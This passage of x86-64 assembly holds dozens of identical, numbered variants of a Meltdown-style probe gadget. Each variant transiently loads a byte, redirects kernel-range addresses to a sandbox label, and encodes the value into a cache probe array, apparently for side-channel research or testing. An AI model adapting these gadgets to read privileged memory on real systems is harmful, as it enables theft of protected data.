	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 247
.Lprobe_one_win0_var247:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 248
.Lprobe_one_win0_var248:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 249
.Lprobe_one_win0_var249:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 250
.Lprobe_one_win0_var250:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 251
.Lprobe_one_win0_var251:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 252
.Lprobe_one_win0_var252:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 253
.Lprobe_one_win0_var253:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 254
.Lprobe_one_win0_var254:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 255
.Lprobe_one_win0_var255:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 256
.Lprobe_one_win0_var256:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 257
.Lprobe_one_win0_var257:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 258
.Lprobe_one_win0_var258:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 259
.Lprobe_one_win0_var259:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 260
.Lprobe_one_win0_var260:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 261
.Lprobe_one_win0_var261:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 262
.Lprobe_one_win0_var262:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 263
.Lprobe_one_win0_var263:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 264
.Lprobe_one_win0_var264:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 265
.Lprobe_one_win0_var265:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 266
.Lprobe_one_win0_var266:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 267
.Lprobe_one_win0_var267:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 268
.Lprobe_one_win0_var268:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 269
.Lprobe_one_win0_var269:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 270
.Lprobe_one_win0_var270:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 271
.Lprobe_one_win0_var271:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 272
.Lprobe_one_win0_var272:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 273
.Lprobe_one_win0_var273:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 274
.Lprobe_one_win0_var274:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 275
.Lprobe_one_win0_var275:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 276
.Lprobe_one_win0_var276:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 277
.Lprobe_one_win0_var277:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 278
.Lprobe_one_win0_var278:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 279
.Lprobe_one_win0_var279:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 280
.Lprobe_one_win0_var280:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 281
.Lprobe_one_win0_var281:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 282
.Lprobe_one_win0_var282:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 283
.Lprobe_one_win0_var283:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 284
.Lprobe_one_win0_var284:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 285
.Lprobe_one_win0_var285:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 286
.Lprobe_one_win0_var286:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 287
.Lprobe_one_win0_var287:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 288
.Lprobe_one_win0_var288:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 289
.Lprobe_one_win0_var289:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 290
.Lprobe_one_win0_var290:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 291
.Lprobe_one_win0_var291:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 292
.Lprobe_one_win0_var292:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 293
.Lprobe_one_win0_var293:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 294
.Lprobe_one_win0_var294:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 295
.Lprobe_one_win0_var295:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 296
.Lprobe_one_win0_var296:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 297
.Lprobe_one_win0_var297:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 298
.Lprobe_one_win0_var298:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 299
.Lprobe_one_win0_var299:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 300
.Lprobe_one_win0_var300:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 301
.Lprobe_one_win0_var301:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 302
.Lprobe_one_win0_var302:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 303
.Lprobe_one_win0_var303:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 304
.Lprobe_one_win0_var304:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 305
.Lprobe_one_win0_var305:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 306
.Lprobe_one_win0_var306:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 307
.Lprobe_one_win0_var307:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 308
.Lprobe_one_win0_var308:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 309
.Lprobe_one_win0_var309:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 310
.Lprobe_one_win0_var310:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 311
.Lprobe_one_win0_var311:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 312
.Lprobe_one_win0_var312:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 313
.Lprobe_one_win0_var313:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 314
.Lprobe_one_win0_var314:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 315
.Lprobe_one_win0_var315:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 316
.Lprobe_one_win0_var316:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 317
.Lprobe_one_win0_var317:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 318
.Lprobe_one_win0_var318:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 319
.Lprobe_one_win0_var319:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 320
.Lprobe_one_win0_var320:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 321
.Lprobe_one_win0_var321:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 322
.Lprobe_one_win0_var322:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 323
.Lprobe_one_win0_var323:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 324
.Lprobe_one_win0_var324:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 325
.Lprobe_one_win0_var325:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 326
.Lprobe_one_win0_var326:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 327
.Lprobe_one_win0_var327:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 328
.Lprobe_one_win0_var328:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 329
.Lprobe_one_win0_var329:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 330
.Lprobe_one_win0_var330:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 331
.Lprobe_one_win0_var331:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
